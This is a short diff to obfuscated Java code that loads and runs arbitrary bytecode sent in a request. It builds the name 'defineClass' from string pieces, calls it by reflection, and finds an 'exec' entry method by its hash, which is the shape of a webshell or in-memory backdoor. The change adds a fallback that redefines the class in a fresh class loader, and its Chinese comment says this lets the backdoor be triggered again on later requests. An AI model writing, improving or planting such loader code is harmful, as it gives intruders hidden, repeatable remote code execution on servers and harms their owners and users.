@@ -20,8 +20,17 @@ if (bundle != null && !bundle.isEmpty()) {
     String dn = "de" + "fine" + "Clas" + "s";
     Method dc = ClassLoader.class.getDeclaredMethod(dn, byte[].class, int.class, int.class);
     dc.setAccessible(true);
-    Class<?> clazz = (Class<?>) dc.invoke(this.getClass().getClassLoader(),
-            new Object[]{ code, Integer.valueOf(0), Integer.valueOf(code.length) });
+    Class<?> clazz;
+    try {
+        clazz = (Class<?>) dc.invoke(this.getClass().getClassLoader(),
+                new Object[]{ code, Integer.valueOf(0), Integer.valueOf(code.length) });
+    } catch (InvocationTargetException ite) {
+        if (!(ite.getCause() instanceof LinkageError)) throw ite;
+        // 同名类已被本加载器定义过(前一次请求), 换一次性子加载器重新定义, 支持重复触发
+        ClassLoader fresh = new ClassLoader(this.getClass().getClassLoader()) { };
+        clazz = (Class<?>) dc.invoke(fresh,
+                new Object[]{ code, Integer.valueOf(0), Integer.valueOf(code.length) });
+    }
     Method entry = null;
     for (Method m : clazz.getMethods()) {
         if (m.getName().hashCode() == 3127441 && m.getParameterCount() == 1) { entry = m; break; }
